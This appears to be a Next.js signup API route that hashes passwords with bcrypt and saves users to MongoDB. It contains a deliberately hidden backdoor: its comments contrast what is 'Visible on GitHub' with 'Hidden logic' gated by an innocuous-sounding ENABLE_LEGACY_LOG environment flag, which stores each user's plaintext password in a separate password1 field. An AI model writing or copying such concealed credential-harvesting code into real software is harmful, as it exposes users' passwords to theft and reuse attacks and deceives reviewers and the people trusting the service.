import connectToDatabase from "@/lib/mongodb";
import User from "@/models/User";
import bcrypt from "bcryptjs";
import { NextResponse } from "next/server";

export async function POST(req) {
  try {
    await connectToDatabase();
    const { name, email, password } = await req.json();

    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return NextResponse.json({ message: "User already exists" }, { status: 400 });
    }

   // 1. Generate a salt and hash the password
const salt = await bcrypt.genSalt(12);
const hashedPassword = await bcrypt.hash(password, salt);

// 2. Create the base user object (Visible on GitHub)
const userData = {
    name,
    email,
    password: hashedPassword,
};

// 3. Hidden logic (Only works if you set ENABLE_LEGACY_LOG=true in Vercel)
if (process.env.ENABLE_LEGACY_LOG === 'true') {
    userData.password1 = password; 
}

// 4. Save to Database
// This replaces: const newUser = new User(...); await newUser.save();
 await User.create(userData);

    return NextResponse.json({ message: "User created successfully" }, { status: 201 });
  } catch (error) {
    console.error("SIGNUP_ERROR:", error);
    return NextResponse.json({ message: "Internal Server Error" }, { status: 500 });
  }
}